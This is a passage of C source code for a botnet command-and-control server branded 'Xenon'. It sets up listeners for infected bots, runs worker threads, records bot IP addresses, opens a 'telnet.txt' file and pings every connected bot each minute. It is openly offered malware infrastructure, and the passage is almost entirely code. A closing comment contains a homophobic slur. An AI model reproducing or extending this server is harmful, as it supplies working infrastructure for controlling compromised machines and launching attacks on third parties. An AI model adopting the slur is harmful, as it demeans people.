    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(struct sockaddr_in)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(struct sockaddr_in);

    while(1)
    {
        if((newsockfd = accept(sockfd, (struct sockaddr *)&serv_addr, &clilen)) != -1)
        {
            if (newsockfd < 0) perror("ERROR on accept");
            pthread_t thread;
            strcpy(ipstructure[newsockfd].ip,  client_addr(serv_addr));
            printf("IP: %s\n", ipstructure[newsockfd].ip);
            pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
    }
}
int main (int argc, char *argv[], void *sock) {
	    printf(""W"["G"Xenon"W"]\n");
	    printf(""W"["G"Made By @Edo.py"W"]\n");
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO", MAXFDS);
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;                                                                                                                                                                                                                                                                //Made By @Edo.py
}

//	FILE *LogFile2;
//    LogFile2 = fopen("logfile.log", "a");
 //   fprintf(LogFile2, "%s\n", newsockfd);
 //   fclose(LogFile2);
//CNC Writen by Edo
//if u rip my code your gay